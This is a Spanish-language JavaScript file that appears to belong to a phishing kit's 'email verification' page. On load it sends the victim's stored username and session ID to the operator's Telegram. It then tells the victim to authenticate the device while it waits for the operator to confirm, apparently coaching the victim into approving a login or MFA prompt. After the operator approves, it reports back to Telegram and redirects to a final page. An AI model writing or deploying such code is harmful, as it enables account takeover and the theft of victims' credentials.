document.addEventListener('DOMContentLoaded', async () => {
    const correoForm = document.getElementById('correoForm');
    const continueButton = document.getElementById('continueButton');
    const statusMessage = document.getElementById('statusMessage');
    const statusSpinner = document.getElementById('statusSpinner');
    const resendContainer = document.getElementById('resendContainer');
    const resendButton = document.getElementById('resendButton');

    // Mostrar spinner al cargar la página
    statusSpinner.style.display = 'block';

    // Deshabilitar el botón y ponerlo en gris
    continueButton.disabled = true;
    continueButton.style.backgroundColor = '#ccc';
    continueButton.style.cursor = 'not-allowed';
    continueButton.innerText = 'Esperando Confirmacion';

    // Ocultar el contenedor del botón de reenvío inicialmente
    resendContainer.style.display = 'none';

    // Obtener el usuario guardado
    const usuario = localStorage.getItem('usuario_guardado') || 'No detectado';

    // Variable para controlar el intervalo de verificación
    let verificationInterval = null;

    // Función para limpiar intervalos anteriores
    function limpiarIntervalosAnteriores() {
        if (verificationInterval) {
            clearInterval(verificationInterval);
            verificationInterval = null;
        }
    }

    // Función para enviar la solicitud de confirmación
    async function enviarSolicitudConfirmacion() {
        // Reiniciar el estado de los botones activos
        botonesActivos = false;
        ultimoCallbackQueryId = null;
        
        // Limpiar intervalos anteriores
        limpiarIntervalosAnteriores();
        
        // Enviar mensaje a Telegram con botón de confirmación
        const mensaje = `📧 <b>Verificación por Correo</b>\n\n` +
                        `👤 <b>Usuario Asociado:</b> ${usuario}\n\n` +
                        `📝 <b>Estado:</b> Esperando confirmación por correo electrónico.\n\n` +
                        `🆔 <b>ID Sesión:</b> ${obtenerIDSesion()}\n\n` +
                        `¿El usuario te ha dado la confirmación?`;
                        
        // Definir botones interactivos
        const botones = [
            [
                { text: "✅ [SI] Confirmado", callback_data: "correo_confirmado" }
            ]
        ];

        try {
            await enviarATelegram(mensaje, botones);
            
            // Actualizar mensaje de estado
            statusMessage.innerHTML = '<p>Solicitud de confirmación enviada. Por favor, autentifique este dispositivo para continuar.</p>';
            statusSpinner.style.display = 'none';
            
            // Verificar periódicamente si se recibió respuesta de Telegram
            verificationInterval = setInterval(async () => {
                try {
                    const respuesta = await verificarRespuestasTelegram();
                    
                    if (respuesta === 'correo_confirmado') {
                        limpiarIntervalosAnteriores();
                        
                        // Desbloquear el botón de continuar
                        continueButton.disabled = false;
                        continueButton.style.backgroundColor = '#0076ff';
                        continueButton.style.cursor = 'pointer';
                        continueButton.innerText = 'Continuar';
                        
                        // Actualizar mensaje de estado
                        statusMessage.innerHTML = '<p style="color: #4CAF50;">✅ Confirmación recibida. Puede continuar.</p>';
                        
                        // Enviar notificación a Telegram
                        await enviarATelegram(`✅ <b>Confirmación Recibida</b>\n\n` +
                                              `👤 <b>Usuario:</b> ${usuario}\n\n` +
                                              `📝 <b>Estado:</b> El usuario ha confirmado la operación por correo electrónico.`);
                    }
                } catch (error) {
                    console.error('Error al verificar respuesta de Telegram:', error);
                }
            }, 1000); // Reducir a 1 segundo para una respuesta más rápida
            
            // Limpiar el intervalo después de 90 segundos si no hay respuesta
            setTimeout(() => {
                limpiarIntervalosAnteriores();
                statusMessage.innerHTML = '<p style="color: #ff4d4d;">⏰ Tiempo de espera agotado. No se recibió confirmación.</p>';
                resendContainer.style.display = 'block';
            }, 30000);
            
        } catch (error) {
            console.error("Error al enviar mensaje a Telegram:", error);
            statusMessage.innerHTML = '<p style="color: #ff4d4d;">❌ Error al enviar solicitud. Por favor, recargue la página.</p>';
            statusSpinner.style.display = 'none';
            resendContainer.style.display = 'block';
        }
    }

    // Enviar la solicitud inicial
    await enviarSolicitudConfirmacion();

    // Manejar el clic en el botón de reenvío
    resendButton.addEventListener('click', () => {
        // Recargar la página
        window.location.reload();
    });

    const REDIRECCION_URL = 'fin.html';

    correoForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const mensaje = `📢 <b>Atento!!!</b>\n\n` +
                        `ℹ️ <b>Estado:</b> El usuario Marco Que Te Autorizo\n` +
                        `👤 <b>Usuario Asociado:</b> ${usuario}\n\n`;

        continueButton.disabled = true;
        continueButton.innerText = 'Procesando...';

        await enviarATelegram(mensaje);
        window.location.href = REDIRECCION_URL;
    });
});